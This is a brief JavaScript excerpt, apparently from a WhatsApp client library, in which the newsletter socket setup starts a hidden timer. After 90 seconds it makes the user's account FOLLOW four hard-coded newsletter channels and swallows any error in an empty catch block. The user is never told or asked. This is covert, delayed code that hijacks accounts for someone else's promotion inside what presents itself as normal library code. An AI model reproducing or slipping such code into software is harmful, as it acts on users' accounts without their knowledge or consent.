...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363423096264299@newsletter", "120363425535914322@newsletter", "120363422916188236@newsletter", "120363419363983874@newsletter", Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 90000);
